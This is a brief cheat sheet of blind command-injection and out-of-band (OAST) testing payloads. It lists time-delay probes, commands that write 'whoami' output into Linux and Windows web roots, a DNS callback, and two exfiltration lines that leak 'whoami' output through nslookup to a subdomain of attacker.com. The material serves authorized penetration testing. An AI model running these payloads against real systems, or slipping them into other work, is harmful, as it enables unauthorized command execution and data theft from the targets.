# Blind & OAST Techniques

## Time Delay Detection

Linux:

ping -c 10 127.0.0.1

sleep 10

Windows:

ping 127.0.0.1 -n 10

timeout 10

---

## File Write Validation

whoami > /var/www/html/whoami.txt

whoami > C:\inetpub\wwwroot\whoami.txt

---

## DNS Callback

nslookup attacker.com

---

## Data Exfiltration

nslookup $(whoami).attacker.com

nslookup `whoami`.attacker.com

---

## OAST Indicators

- DNS interaction
- HTTP interaction
- SMB interaction
- Delayed callback

Always monitor collaborator infrastructure.